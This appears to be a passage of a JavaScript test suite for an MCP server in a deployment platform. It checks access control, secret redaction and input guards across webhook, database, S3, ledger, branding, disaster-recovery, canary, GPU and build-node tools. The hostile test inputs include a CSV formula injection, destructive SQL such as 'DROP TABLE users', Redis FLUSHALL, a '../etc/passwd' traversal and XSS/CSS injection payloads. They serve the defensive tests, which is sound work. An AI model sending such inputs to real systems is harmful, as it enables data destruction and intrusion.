async function testMcp2026Cycle9WebhooksDbS3LedgerBrand() {
  const fs = require('fs');
  const os = require('os');
  const path = require('path');
  const projectManager = require('../server/services/projectManager');
  const databaseManager = require('../server/services/databaseManager');
  const webhookEventBus = require('../server/services/webhookEventBus');
  const quotaMeteringService = require('../server/services/quotaMeteringService');
  const brandThemeService = require('../server/services/brandThemeService');

  const tmpDataRoot = fs.mkdtempSync(path.join(os.tmpdir(), 'culkibo-mcp-c9-'));
  const prevDataDir = process.env.CULKIBO_DATA_DIR;
  process.env.CULKIBO_DATA_DIR = tmpDataRoot;
  // Reset cached file paths so singletons bind strictly to tmpDataRoot (0 live data/ mutations!)
  if ('_loadedPath' in brandThemeService) brandThemeService._loadedPath = null;
  if ('_loadedPath' in quotaMeteringService) quotaMeteringService._loadedPath = null;

  const projA = projectManager.create({
    name: '=CMD|calc!A0',
    description: 'Cycle 9 tenant A project (tests CSV formula neutralization)',
    memoryMb: 512,
    cpus: 1,
    teamId: 'team_default'
  });
  const projB = projectManager.create({
    name: 'Cycle9 Foreign Tenant B',
    description: 'Tenant B secret project',
    memoryMb: 2048,
    cpus: 2,
    teamId: 'team_default'
  });

  // Inject synthetic database records in memory (restored cleanly in finally, zero Docker required)
  const origDbList = databaseManager.list;
  const fakeDbs = [
    { id: 'db_c9_a', name: 'pg-tenant-a', engine: 'postgres', projectId: projA.id, storageGb: 10 },
    { id: 'db_c9_b', name: 'pg-tenant-b', engine: 'postgres', projectId: projB.id, storageGb: 25 }
  ];
  databaseManager.list = () => fakeDbs;

  const unscopedViewerAuth = {
    ok: true,
    method: 'api_token',
    principal: { userId: 'usr_c9_viewer_u', role: 'viewer', teamId: 'team_default', projectIds: null, scopes: ['*'] }
  };
  const scopedViewerAuth = {
    ok: true,
    method: 'api_token',
    principal: { userId: 'usr_c9_viewer', role: 'viewer', teamId: 'team_default', projectIds: [projA.id], scopes: ['*'] }
  };
  const scopedDevAuth = {
    ok: true,
    method: 'api_token',
    principal: { userId: 'usr_c9_dev', role: 'developer', teamId: 'team_default', projectIds: [projA.id], scopes: ['*'] }
  };
  const unscopedDevAuth = {
    ok: true,
    method: 'api_token',
    principal: { userId: 'usr_c9_dev_u', role: 'developer', teamId: 'team_default', projectIds: null, scopes: ['*'] }
  };

  try {
    // 1. culkibo_webhook_dlq (dev/admin RBAC, dryRun default on replay/rotate_secret, whsec_ redacted!)
    const whViewerBlocked = await mcpServer.executeTool('culkibo_webhook_dlq', { action: 'list_dlq' }, { auth: unscopedViewerAuth });
    assert.strictEqual(whViewerBlocked.isError, true);
    assert.strictEqual(JSON.parse(whViewerBlocked.content[0].text).code, 'FORBIDDEN');

    const createdSub = webhookEventBus.upsertSubscription({
      url: 'https://hooks.example.com/culkibo-c9',
      events: ['deploy.*'],
      description: 'Cycle9 MCP test webhook'
    });
    assert.ok(createdSub.ok && createdSub.secret.startsWith('whsec_'));

    const subListRes = await mcpServer.executeTool('culkibo_webhook_dlq', { action: 'list_subscriptions' }, { auth: unscopedDevAuth });
    assert.strictEqual(subListRes.isError, false);
    assert.ok(subListRes.structuredContent.count >= 1);
    assert.ok(!JSON.stringify(subListRes.structuredContent).includes(createdSub.secret), 'list_subscriptions jamás debe filtrar whsec_ raw');

    // rotate_secret omitting dryRun -> defaults to safe dryRun: true
    const rotDryDefault = await mcpServer.executeTool('culkibo_webhook_dlq', {
      action: 'rotate_secret',
      subscriptionId: createdSub.subscription.id,
      graceSec: 3600
    }, { auth: unscopedDevAuth });
    assert.strictEqual(rotDryDefault.isError, false);
    assert.strictEqual(rotDryDefault.structuredContent.dryRun, true);
    assert.strictEqual(rotDryDefault.structuredContent.rotated, false);

    // rotate_secret with explicit dryRun: true -> previewToolPlan
    const rotPreview = await mcpServer.executeTool('culkibo_webhook_dlq', {
      action: 'rotate_secret',
      subscriptionId: createdSub.subscription.id,
      dryRun: true
    }, { auth: unscopedDevAuth });
    assert.strictEqual(rotPreview.isError, false);
    assert.strictEqual(rotPreview.structuredContent.dryRun, true);
    assert.strictEqual(rotPreview.structuredContent.wouldExecute, true);

    // rotate_secret with dryRun: false -> rotates dual-secret AND redacts audit log!
    const rotLive = await mcpServer.executeTool('culkibo_webhook_dlq', {
      action: 'rotate_secret',
      subscriptionId: createdSub.subscription.id,
      graceSec: 3600,
      dryRun: false
    }, { auth: unscopedDevAuth });
    assert.strictEqual(rotLive.isError, false);
    assert.strictEqual(rotLive.structuredContent.rotated, true);
    assert.ok(rotLive.structuredContent.rotation.secret.startsWith('whsec_'));
    const whAudit = mcpServer.getAuditLog(1)[0];
    assert.strictEqual(whAudit.resultSummary, '[resultado sensible ocultado en auditoría]');
    assert.ok(!JSON.stringify(whAudit).includes(rotLive.structuredContent.rotation.secret), 'whsec_ jamás puede filtrarse al auditLog');

    const replayDry = await mcpServer.executeTool('culkibo_webhook_dlq', { action: 'replay', dlqId: 'dlq_sample_1' }, { auth: unscopedDevAuth });
    assert.strictEqual(replayDry.isError, false);
    assert.strictEqual(replayDry.structuredContent.dryRun, true);
    assert.strictEqual(replayDry.structuredContent.replayed, false);
    console.log('  ✓ culkibo_webhook_dlq verificado (RBAC dev/admin, dryRun default, dual-secret rotation y whsec_ redactado)');

    // 2. culkibo_db_studio (RO dev/admin, DB/project ACL, SQL write block, Redis safe allowlist, bloat)
    const dbViewerBlocked = await mcpServer.executeTool('culkibo_db_studio', { mode: 'sql', query: 'SELECT 1' }, { auth: scopedViewerAuth });
    assert.strictEqual(dbViewerBlocked.isError, true);
    assert.strictEqual(JSON.parse(dbViewerBlocked.content[0].text).code, 'FORBIDDEN');

    const dbIdorBlocked = await mcpServer.executeTool('culkibo_db_studio', {
      databaseId: 'db_c9_b',
      mode: 'sql',
      query: 'SELECT 1'
    }, { auth: scopedDevAuth });
    assert.strictEqual(dbIdorBlocked.isError, true);
    assert.strictEqual(JSON.parse(dbIdorBlocked.content[0].text).code, 'FORBIDDEN');

    const sqlOk = await mcpServer.executeTool('culkibo_db_studio', {
      databaseId: 'db_c9_a',
      mode: 'sql',
      query: 'SELECT id, email FROM users ORDER BY created_at DESC'
    }, { auth: scopedDevAuth });
    assert.strictEqual(sqlOk.isError, false);
    assert.strictEqual(sqlOk.structuredContent.readOnlyEnforced, true);
    assert.ok(sqlOk.structuredContent.result.wrappedSql.includes('BEGIN TRANSACTION READ ONLY'));
    assert.ok(sqlOk.structuredContent.result.wrappedSql.includes('LIMIT 200'));

    const sqlWrite1 = await mcpServer.executeTool('culkibo_db_studio', {
      databaseId: 'db_c9_a',
      mode: 'sql',
      query: 'SELECT 1; DROP TABLE users;'
    }, { auth: scopedDevAuth });
    assert.strictEqual(sqlWrite1.isError, true);
    const sqlWrite2 = await mcpServer.executeTool('culkibo_db_studio', {
      databaseId: 'db_c9_a',
      mode: 'sql',
      query: 'WITH x AS (DELETE FROM users RETURNING *) SELECT * FROM x'
    }, { auth: scopedDevAuth });
    assert.strictEqual(sqlWrite2.isError, true);

    const redisOk = await mcpServer.executeTool('culkibo_db_studio', {
      databaseId: 'db_c9_a',
      mode: 'redis',
      argv: ['SCAN', '0', 'COUNT', '500']
    }, { auth: scopedDevAuth });
    assert.strictEqual(redisOk.isError, false);
    assert.ok(redisOk.structuredContent.result.normalizedArgv.includes('100'), 'SCAN COUNT debe acotarse a <=100');

    const redisBlocked = await mcpServer.executeTool('culkibo_db_studio', {
      databaseId: 'db_c9_a',
      mode: 'redis',
      argv: ['FLUSHALL']
    }, { auth: scopedDevAuth });
    assert.strictEqual(redisBlocked.isError, true);

    const bloatOk = await mcpServer.executeTool('culkibo_db_studio', {
      mode: 'bloat',
      tableStats: [{ tableName: 'events', liveTuples: 1000, deadTuples: 25000, sizeBytes: 1048576 }]
    }, { auth: scopedDevAuth });
    assert.strictEqual(bloatOk.isError, false);
    assert.ok(bloatOk.structuredContent.result.bloatedTables.length >= 1);
    console.log('  ✓ culkibo_db_studio verificado (BEGIN TRANSACTION READ ONLY, SQL/CTE write-block, Redis allowlist, bloat y anti-IDOR)');

    // 3. culkibo_s3_storage (dev/admin RBAC, Garage/RustFS/SeaweedFS, SigV4 presign + audit redaction, CORS/Lifecycle)
    const s3ViewerBlocked = await mcpServer.executeTool('culkibo_s3_storage', { action: 'presets' }, { auth: unscopedViewerAuth });
    assert.strictEqual(s3ViewerBlocked.isError, true);
    assert.strictEqual(JSON.parse(s3ViewerBlocked.content[0].text).code, 'FORBIDDEN');

    const s3Presets = await mcpServer.executeTool('culkibo_s3_storage', { action: 'presets' }, { auth: scopedDevAuth });
    assert.strictEqual(s3Presets.isError, false);
    assert.strictEqual(s3Presets.structuredContent.presets.length, 3);
    assert.ok(s3Presets.structuredContent.presets.every((p) => p.bindAddress === '127.0.0.1'));

    const s3SecretCanary = 'SUPER_SECRET_S3_KEY_C9_99999';
    const s3Presign = await mcpServer.executeTool('culkibo_s3_storage', {
      action: 'presign',
      endpoint: 'https://s3.acme.internal',
      bucket: 'backups-prod',
      key: 'pg/2026/dump.sql.gz',
      method: 'GET',
      accessKeyId: 'AKIAEXAMPLEC9',
      secretAccessKey: s3SecretCanary,
      expiresIn: 900
    }, { auth: scopedDevAuth });
    assert.strictEqual(s3Presign.isError, false);
    assert.strictEqual(s3Presign.structuredContent.presigned.algorithm, 'AWS4-HMAC-SHA256');
    assert.ok(s3Presign.structuredContent.presigned.url.includes('X-Amz-Signature='));
    const s3Audit = mcpServer.getAuditLog(1)[0];
    assert.strictEqual(s3Audit.resultSummary, '[resultado sensible ocultado en auditoría]');
    assert.ok(!JSON.stringify(s3Audit).includes(s3SecretCanary), 'secretAccessKey JAMÁS puede filtrarse al auditLog');

    const s3Traversal = await mcpServer.executeTool('culkibo_s3_storage', {
      action: 'presign',
      endpoint: 'https://s3.acme.internal',
      bucket: 'backups-prod',
      key: '../etc/passwd',
      accessKeyId: 'AKIAEXAMPLEC9',
      secretAccessKey: s3SecretCanary
    }, { auth: scopedDevAuth });
    assert.strictEqual(s3Traversal.isError, true);

    const s3CorsBad = await mcpServer.executeTool('culkibo_s3_storage', {
      action: 'cors_xml',
      rules: [{ allowedOrigins: ['*'], allowedMethods: ['GET'], allowCredentials: true }]
    }, { auth: scopedDevAuth });
    assert.strictEqual(s3CorsBad.isError, true);

    const s3Life = await mcpServer.executeTool('culkibo_s3_storage', {
      action: 'lifecycle_xml',
      rules: [{ id: 'expire-30d', prefix: 'tmp/', expirationDays: 30, abortMultipartDays: 3 }]
    }, { auth: scopedDevAuth });
    assert.strictEqual(s3Life.isError, false);
    assert.ok(s3Life.structuredContent.xml.includes('<LifecycleConfiguration'));
    console.log('  ✓ culkibo_s3_storage verificado (3 presets Post-MinIO, SigV4 presign, secretAccessKey redactado, traversal/CORS guard)');

    // 4. culkibo_agency_ledger (RO viewer/dev/admin, strict tenant ACL, CSV formula neutralization, quota fail-closed)
    quotaMeteringService.setQuota(projA.id, { containers: 4, memoryMb: 1024, cpuCores: 2, storageGb: 20, bandwidthGbMo: 200 });
    quotaMeteringService.setQuota(projB.id, { containers: 8, memoryMb: 4096, cpuCores: 4, storageGb: 100, bandwidthGbMo: 1000 });

    const ledgerIdor = await mcpServer.executeTool('culkibo_agency_ledger', {
      action: 'ledger',
      projectId: projB.id
    }, { auth: scopedViewerAuth });
    assert.strictEqual(ledgerIdor.isError, true);
    assert.strictEqual(JSON.parse(ledgerIdor.content[0].text).code, 'FORBIDDEN');

    const ledgerCsv = await mcpServer.executeTool('culkibo_agency_ledger', {
      action: 'csv',
      periodDays: 30
    }, { auth: scopedViewerAuth });
    assert.strictEqual(ledgerCsv.isError, false);
    assert.strictEqual(ledgerCsv.structuredContent.ledger.entries.length, 1, 'Ledger debe aislar estrictamente al tenant ACL');
    assert.strictEqual(ledgerCsv.structuredContent.ledger.entries[0].projectId, projA.id);
    assert.ok(!ledgerCsv.structuredContent.csv.includes(projB.id), 'CSV jamás puede filtrar proyectos de otros tenants');
    assert.ok(ledgerCsv.structuredContent.csv.includes("'=CMD|calc!A0"), 'CSV debe neutralizar fórmulas =/+/-/@ con prefijo apóstrofo');

    const quotasScoped = await mcpServer.executeTool('culkibo_agency_ledger', { action: 'list_quotas' }, { auth: scopedViewerAuth });
    assert.strictEqual(quotasScoped.isError, false);
    assert.strictEqual(quotasScoped.structuredContent.quotas.length, 1);
    assert.strictEqual(quotasScoped.structuredContent.quotas[0].projectId, projA.id);

    const quotaOver = await mcpServer.executeTool('culkibo_agency_ledger', {
      action: 'check_quota',
      projectId: projA.id,
      requested: { memoryMb: 4096, containers: 10 }
    }, { auth: scopedViewerAuth });
    assert.strictEqual(quotaOver.isError, false);
    assert.strictEqual(quotaOver.structuredContent.check.allowed, false);
    assert.ok(quotaOver.structuredContent.check.violations.length >= 2);
    console.log('  ✓ culkibo_agency_ledger verificado (RO viewer, aislamiento cross-tenant CVE-2026-116068, CSV formula-safe y cuotas fail-closed)');

    // 5. culkibo_brand_theme (viewer get allowed, update/reset admin-only, dryRun default, strict anti-XSS/CSS guard)
    const brandGet = await mcpServer.executeTool('culkibo_brand_theme', { action: 'get' }, { auth: unscopedViewerAuth });
    assert.strictEqual(brandGet.isError, false);
    assert.strictEqual(brandGet.structuredContent.brand.brandName, 'Culkibo');

    const brandDevBlocked = await mcpServer.executeTool('culkibo_brand_theme', {
      action: 'update',
      patch: { brandName: 'Hacked' },
      dryRun: true
    }, { auth: unscopedDevAuth });
    assert.strictEqual(brandDevBlocked.isError, true);
    assert.strictEqual(JSON.parse(brandDevBlocked.content[0].text).code, 'FORBIDDEN');

    const brandXss = await mcpServer.executeTool('culkibo_brand_theme', {
      action: 'update',
      patch: { logoUrl: 'javascript:alert(1)' },
      dryRun: true
    });
    assert.strictEqual(brandXss.isError, true);
    assert.strictEqual(JSON.parse(brandXss.content[0].text).code, 'INVALID_BRAND_PATCH');

    const brandCssInj = await mcpServer.executeTool('culkibo_brand_theme', {
      action: 'update',
      patch: { accentHex: '#fff;background:url(evil)' }
    });
    assert.strictEqual(brandCssInj.isError, true);

    const brandDry = await mcpServer.executeTool('culkibo_brand_theme', {
      action: 'update',
      patch: { brandName: 'Acme Agency Cloud', accentHex: '#10b981' }
    });
    assert.strictEqual(brandDry.isError, false);
    assert.strictEqual(brandDry.structuredContent.dryRun, true);
    assert.strictEqual(brandDry.structuredContent.updated, false);
    assert.strictEqual(brandThemeService.getBrand().brandName, 'Culkibo');

    const brandLive = await mcpServer.executeTool('culkibo_brand_theme', {
      action: 'update',
      patch: { brandName: 'Acme Agency Cloud', accentHex: '#10b981', hidePoweredBy: true },
      dryRun: false
    });
    assert.strictEqual(brandLive.isError, false);
    assert.strictEqual(brandLive.structuredContent.updated, true);
    assert.strictEqual(brandLive.structuredContent.brand.brandName, 'Acme Agency Cloud');
    assert.strictEqual(brandLive.structuredContent.brand.accentHex, '#10b981');

    const brandReset = await mcpServer.executeTool('culkibo_brand_theme', { action: 'reset', dryRun: false });
    assert.strictEqual(brandReset.isError, false);
    assert.strictEqual(brandReset.structuredContent.brand.brandName, 'Culkibo');
    console.log('  ✓ culkibo_brand_theme verificado (viewer get, admin-only update/reset, anti-XSS/CSS guard y dryRun default)');

    // 6. Final Cycle-9 milestone assertion: exact 160 tools & ?profile=core 17/160 >=85% token reduction!
    const all130 = mcpServer.getToolsForPrincipal(null, { profile: 'all' });
    const core17 = mcpServer.getToolsForPrincipal(null, { profile: 'core' });
    const saved130Pct = Math.round((1 - Buffer.byteLength(JSON.stringify(core17), 'utf8') / Buffer.byteLength(JSON.stringify(all130), 'utf8')) * 1000) / 10;
    assert.strictEqual(all130.length, 170);
    assert.strictEqual(core17.length, 17);
    assert.ok(saved130Pct >= 85, `?profile=core debe ahorrar >=85% tokens en 160 tools (actual: ${saved130Pct}%)`);
    console.log(`  ✓ Catálogo Cycle-9 verificado: 160 tools exactas, ?profile=core 17/160 (-${saved130Pct}% tokens/bytes)`);
  } finally {
    databaseManager.list = origDbList;
    projectManager.delete(projA.id);
    projectManager.delete(projB.id);
    await projectManager.flushToDisk();
    if (prevDataDir === undefined) delete process.env.CULKIBO_DATA_DIR;
    else process.env.CULKIBO_DATA_DIR = prevDataDir;
    if ('_loadedPath' in brandThemeService) brandThemeService._loadedPath = null;
    if ('_loadedPath' in quotaMeteringService) quotaMeteringService._loadedPath = null;
    try { fs.rmSync(tmpDataRoot, { recursive: true, force: true }); } catch (e) {}
  }
}

/**
 * MCP 2026 Cycle-10 Milestone: DR Fire-Drill (`culkibo_dr_drill`), SLO Error-Budget Canary (`culkibo_slo_canary`),
 * AI/GPU LLM Orchestrator (`culkibo_ai_workload`), Remote Build-Node Offloader (`culkibo_remote_builder`),
 * Compressed `.ndjson.gz` Log Archive Search (`culkibo_log_archive_search`), and `-86%+` `?profile=core` at 135 tools.
 */
async function testMcp2026Cycle10DrCanaryAiBuilderLogs() {
  const fs = require('fs');
  const os = require('os');
  const path = require('path');
  const zlib = require('zlib');
  const crypto = require('crypto');
  const projectManager = require('../server/services/projectManager');
  const databaseManager = require('../server/services/databaseManager');
  const backupDrillService = require('../server/services/backupDrillService');
  const remoteBuilderService = require('../server/services/remoteBuilderService');
  const logArchiveService = require('../server/services/logArchiveService');

  const tmpDataRoot = fs.mkdtempSync(path.join(os.tmpdir(), 'culkibo-mcp-c10-'));
  const prevDataDir = process.env.CULKIBO_DATA_DIR;
  process.env.CULKIBO_DATA_DIR = tmpDataRoot;
  if ('_loadedPath' in backupDrillService) backupDrillService._loadedPath = null;
  if ('_loadedPath' in remoteBuilderService) remoteBuilderService._loadedPath = null;

  const projA = projectManager.create({
    name: 'Cycle10 Tenant A',
    memoryMb: 512,
    teamId: 'team_default'
  });
  const projB = projectManager.create({
    name: 'Cycle10 Foreign Tenant B',
    memoryMb: 512,
    teamId: 'team_default'
  });

  const origDbList = databaseManager.list;
  databaseManager.list = () => [
    { id: 'db_c10_a', name: 'pg-c10-a', engine: 'postgres', projectId: projA.id },
    { id: 'db_c10_b', name: 'pg-c10-b', engine: 'postgres', projectId: projB.id }
  ];

  const scopedViewerAuth = {
    ok: true,
    method: 'api_token',
    principal: { userId: 'usr_c10_viewer', role: 'viewer', teamId: 'team_default', projectIds: [projA.id], scopes: ['*'] }
  };
  const scopedDevAuth = {
    ok: true,
    method: 'api_token',
    principal: { userId: 'usr_c10_dev', role: 'developer', teamId: 'team_default', projectIds: [projA.id], scopes: ['*'] }
  };
  const unscopedDevAuth = {
    ok: true,
    method: 'api_token',
    principal: { userId: 'usr_c10_dev_u', role: 'developer', teamId: 'team_default', projectIds: null, scopes: ['*'] }
  };

  try {
    // 1. culkibo_dr_drill (dev/admin RBAC, DB/project ACL, 20B empty gzip FAIL, valid SQL PASS, cross-org 403)
    const drViewerBlocked = await mcpServer.executeTool('culkibo_dr_drill', { action: 'list_drills' }, { auth: scopedViewerAuth });
    assert.strictEqual(drViewerBlocked.isError, true);
    assert.strictEqual(JSON.parse(drViewerBlocked.content[0].text).code, 'FORBIDDEN');

    const drIdor = await mcpServer.executeTool('culkibo_dr_drill', {
      action: 'run_drill',
      databaseId: 'db_c10_b',
      sqlSample: '-- PostgreSQL database dump\nCREATE TABLE t (id INT);'
    }, { auth: scopedDevAuth });
    assert.strictEqual(drIdor.isError, true);
    assert.strictEqual(JSON.parse(drIdor.content[0].text).code, 'FORBIDDEN');

    // Empty 20-byte gzip payload -> FAIL
    const emptyGz = zlib.gzipSync(Buffer.alloc(0));
    const drEmptyFail = await mcpServer.executeTool('culkibo_dr_drill', {
      action: 'run_drill',
      databaseId: 'db_c10_a',
      artifactBase64: emptyGz.toString('base64')
    }, { auth: scopedDevAuth });
    assert.strictEqual(drEmptyFail.isError, false);
    assert.strictEqual(drEmptyFail.structuredContent.ok, false);
    assert.strictEqual(drEmptyFail.structuredContent.verdict, 'FAIL');

    // Valid gzipped Postgres dump with matching SHA-256 -> PASS
    const goodSql = '-- PostgreSQL database dump\nCREATE TABLE orders (id SERIAL PRIMARY KEY, total NUMERIC);\nINSERT INTO orders (total) VALUES (99.50);\nGRANT SELECT ON orders TO app_reader;\n';
    const goodGz = zlib.gzipSync(Buffer.from(goodSql, 'utf8'));
    const goodSha = crypto.createHash('sha256').update(goodGz).digest('hex');
    const drPass = await mcpServer.executeTool('culkibo_dr_drill', {
      action: 'run_drill',
      databaseId: 'db_c10_a',
      artifactBase64: goodGz.toString('base64'),
      expectedSha256: goodSha
    }, { auth: scopedDevAuth });
    assert.strictEqual(drPass.isError, false);
    assert.strictEqual(drPass.structuredContent.ok, true);
    assert.strictEqual(drPass.structuredContent.verdict, 'PASS');
    assert.strictEqual(drPass.structuredContent.drill.sha256, goodSha);

    const drCrossOrg = await mcpServer.executeTool('culkibo_dr_drill', {
      action: 'cross_restore_plan',
      sourceDatabaseId: 'db_c10_a',
      targetDatabaseId: 'db_other',
      sourceOrgId: 'org_alpha',
      targetOrgId: 'org_beta'
    }, { auth: scopedDevAuth });
    assert.strictEqual(drCrossOrg.isError, true);
    assert.strictEqual(JSON.parse(drCrossOrg.content[0].text).code, 'CROSS_ORG_RESTORE_FORBIDDEN');

    const drSameOrg = await mcpServer.executeTool('culkibo_dr_drill', {
      action: 'cross_restore_plan',
      sourceDatabaseId: 'db_c10_a',
      targetDatabaseId: 'db_c10_staging',
      sourceOrgId: 'org_alpha',
      targetOrgId: 'org_alpha',
      preserveAcl: true
    }, { auth: scopedDevAuth });
    assert.strictEqual(drSameOrg.isError, false);
    assert.strictEqual(drSameOrg.structuredContent.verdict, 'ALLOWED');
    console.log('  ✓ culkibo_dr_drill verificado (20B empty gzip FAIL, valid .sql.gz PASS + SHA-256, cross-org 403 y anti-IDOR)');

    // 2. culkibo_slo_canary (dev/admin RBAC, project ACL, dryRun default, 10->25 advance & burn-rate instant ROLLED_BACK)
    const sloIdor = await mcpServer.executeTool('culkibo_slo_canary', {
      action: 'start',
      projectId: projB.id,
      hostname: 'foreign.acme.dev',
      stableUpstream: '127.0.0.1:4101',
      canaryUpstream: '127.0.0.1:4102'
    }, { auth: scopedDevAuth });
    assert.strictEqual(sloIdor.isError, true);
    assert.strictEqual(JSON.parse(sloIdor.content[0].text).code, 'FORBIDDEN');

    // start omitting dryRun -> safe dryRun: true (returns Caddy weighted_round_robin route, 0 mutations)
    const sloDryStart = await mcpServer.executeTool('culkibo_slo_canary', {
      action: 'start',
      projectId: projA.id,
      hostname: 'api.acme.dev',
      stableUpstream: '127.0.0.1:4101',
      canaryUpstream: '127.0.0.1:4102'
    }, { auth: scopedDevAuth });
    assert.strictEqual(sloDryStart.isError, false);
    assert.strictEqual(sloDryStart.structuredContent.dryRun, true);
    assert.strictEqual(sloDryStart.structuredContent.started, false);
    assert.ok(sloDryStart.structuredContent.caddyRoute);

    // start live -> 10%, evaluate pass -> 25%, evaluate burn-rate breach -> ROLLED_BACK 100/0!
    const sloLive = await mcpServer.executeTool('culkibo_slo_canary', {
      action: 'start',
      projectId: projA.id,
      hostname: 'api.acme.dev',
      stableUpstream: '127.0.0.1:4101',
      canaryUpstream: '127.0.0.1:4102',
      dryRun: false
    }, { auth: scopedDevAuth });
    assert.strictEqual(sloLive.isError, false);
    assert.strictEqual(sloLive.structuredContent.rollout.canaryWeight, 10);
    const rolloutId = sloLive.structuredContent.rollout.id;

    const sloAdvance = await mcpServer.executeTool('culkibo_slo_canary', {
      action: 'evaluate',
      rolloutId,
      totalRequests: 5000,
      error5xxCount: 1,
      baselineP95Ms: 40,
      canaryP95Ms: 45
    }, { auth: scopedDevAuth });
    assert.strictEqual(sloAdvance.isError, false);
    assert.strictEqual(sloAdvance.structuredContent.rollout.canaryWeight, 25);
    assert.strictEqual(sloAdvance.structuredContent.rollout.status, 'IN_PROGRESS');

    const sloBreach = await mcpServer.executeTool('culkibo_slo_canary', {
      action: 'evaluate',
      rolloutId,
      totalRequests: 1000,
      error5xxCount: 50,
      baselineP95Ms: 40,
      canaryP95Ms: 42
    }, { auth: scopedDevAuth });
    assert.strictEqual(sloBreach.isError, false);
    assert.strictEqual(sloBreach.structuredContent.rollout.status, 'ROLLED_BACK');
    assert.strictEqual(sloBreach.structuredContent.rollout.canaryWeight, 0);
    console.log('  ✓ culkibo_slo_canary verificado (dryRun default, Caddy weighted_round_robin, 10→25 advance y burn-rate instant ROLLED_BACK)');

    // 3. culkibo_ai_workload (RO dev/admin, VRAM pre-flight, CDI, CVE audit, public 0.0.0.0:11434 block)
    const aiViewerBlocked = await mcpServer.executeTool('culkibo_ai_workload', { action: 'presets' }, { auth: scopedViewerAuth });
    assert.strictEqual(aiViewerBlocked.isError, true);
    assert.strictEqual(JSON.parse(aiViewerBlocked.content[0].text).code, 'FORBIDDEN');

    const aiPresets = await mcpServer.executeTool('culkibo_ai_workload', { action: 'presets' }, { auth: scopedDevAuth });
    assert.strictEqual(aiPresets.isError, false);
    assert.strictEqual(aiPresets.structuredContent.presets.length, 3);

    const aiPlanOk = await mcpServer.executeTool('culkibo_ai_workload', {
      action: 'plan',
      runtime: 'ollama',
      model: 'llama3.2:8b',
      paramsB: 8,
      quantization: 'Q4_K_M',
      availableVramGb: 16,
      gpuMode: 'cdi'
    }, { auth: scopedDevAuth });
    assert.strictEqual(aiPlanOk.isError, false);
    assert.ok(aiPlanOk.structuredContent.spec.dockerArgs.includes('nvidia.com/gpu=all'));

    const aiVramOverflow = await mcpServer.executeTool('culkibo_ai_workload', {
      action: 'plan',
      runtime: 'vllm',
      model: 'meta-llama/Llama-3.3-70B-Instruct',
      paramsB: 70,
      quantization: 'FP16',
      availableVramGb: 16
    }, { auth: scopedDevAuth });
    assert.strictEqual(aiVramOverflow.isError, true);
    assert.strictEqual(JSON.parse(aiVramOverflow.content[0].text).code, 'VRAM_INSUFFICIENT');

    const aiPublicBlocked = await mcpServer.executeTool('culkibo_ai_workload', {
      action: 'plan',
      runtime: 'ollama',
      bindAddress: '0.0.0.0',
      authProxyEnabled: false,
      availableVramGb: 24
    }, { auth: scopedDevAuth });
    assert.strictEqual(aiPublicBlocked.isError, true);
    assert.strictEqual(JSON.parse(aiPublicBlocked.content[0].text).code, 'PUBLIC_AI_ENDPOINT_BLOCKED');

    const aiAuditVuln = await mcpServer.executeTool('culkibo_ai_workload', {
      action: 'audit_image',
      runtime: 'vllm',
      imageTag: 'vllm/vllm-openai:v0.19.0'
    }, { auth: scopedDevAuth });
    assert.strictEqual(aiAuditVuln.isError, false);
    assert.strictEqual(aiAuditVuln.structuredContent.security.safe, false);
    assert.ok(aiAuditVuln.structuredContent.security.cves.some((c) => JSON.stringify(c).includes('CVE-2026-22778')));
    console.log('  ✓ culkibo_ai_workload verificado (3 presets, CDI, VRAM_INSUFFICIENT, PUBLIC_AI_ENDPOINT_BLOCKED y CVE-2026-22778)');

    // 4. culkibo_remote_builder (admin RBAC, dryRun default on register/schedule, SSH mux ref-count pinning, prune argv)
    const rbDevBlocked = await mcpServer.executeTool('culkibo_remote_builder', { action: 'list' }, { auth: unscopedDevAuth });
    assert.strictEqual(rbDevBlocked.isError, true);
    assert.strictEqual(JSON.parse(rbDevBlocked.content[0].text).code, 'FORBIDDEN');

    const rbRegDry = await mcpServer.executeTool('culkibo_remote_builder', {
      action: 'register',
      builderId: 'bld_eu_1',
      name: 'EU Build Node 1',
      host: '10.88.0.10',
      arch: 'linux/amd64',
      maxConcurrency: 2,
      allowPreviews: true
    });
    assert.strictEqual(rbRegDry.isError, false);
    assert.strictEqual(rbRegDry.structuredContent.dryRun, true);
    assert.strictEqual(rbRegDry.structuredContent.registered, false);

    const rbRegLive = await mcpServer.executeTool('culkibo_remote_builder', {
      action: 'register',
      builderId: 'bld_eu_1',
      name: 'EU Build Node 1',
      host: '10.88.0.10',
      arch: 'linux/amd64',
      maxConcurrency: 2,
      allowPreviews: true,
      dryRun: false
    });
    assert.strictEqual(rbRegLive.isError, false);
    assert.strictEqual(rbRegLive.structuredContent.registered, true);

    const rbSchedDry = await mcpServer.executeTool('culkibo_remote_builder', {
      action: 'schedule',
      builderId: 'bld_eu_1',
      isPreview: true,
      projectId: projA.id
    });
    assert.strictEqual(rbSchedDry.isError, false);
    assert.strictEqual(rbSchedDry.structuredContent.dryRun, true);

    const rbSchedLive = await mcpServer.executeTool('culkibo_remote_builder', {
      action: 'schedule',
      builderId: 'bld_eu_1',
      isPreview: true,
      projectId: projA.id,
      dryRun: false
    });
    assert.strictEqual(rbSchedLive.isError, false);
    assert.strictEqual(rbSchedLive.structuredContent.lease.sshMuxPinned, true);

    const muxBlocked = await mcpServer.executeTool('culkibo_remote_builder', {
      action: 'can_recycle_mux',
      builderId: 'bld_eu_1'
    });
    assert.strictEqual(muxBlocked.isError, false);
    assert.strictEqual(muxBlocked.structuredContent.muxStatus.allowed, false);
    assert.strictEqual(muxBlocked.structuredContent.muxStatus.reason, 'ACTIVE_BUILDS_IN_FLIGHT');

    remoteBuilderService.releaseBuildSlot(rbSchedLive.structuredContent.lease.leaseId);
    const muxIdle = await mcpServer.executeTool('culkibo_remote_builder', {
      action: 'can_recycle_mux',
      builderId: 'bld_eu_1'
    });
    assert.strictEqual(muxIdle.structuredContent.muxStatus.allowed, true);

    const rbPrune = await mcpServer.executeTool('culkibo_remote_builder', { action: 'prune_plan', keepStorageGb: 25 });
    assert.strictEqual(rbPrune.isError, false);
    assert.ok(Array.isArray(rbPrune.structuredContent.pruneArgs) && rbPrune.structuredContent.pruneArgs.includes('25GB'));
    console.log('  ✓ culkibo_remote_builder verificado (admin RBAC, dryRun default, SSH mux ref-count pinning y buildx prune argv)');

    // 5. culkibo_log_archive_search (RO viewer/dev/admin, strict project ACL, compressed .ndjson.gz search & ReDoS guard)
    logArchiveService.appendLogs(projA.id, [
      { level: 'info', releaseId: 'rel_101', message: 'Server listening on port 3000' },
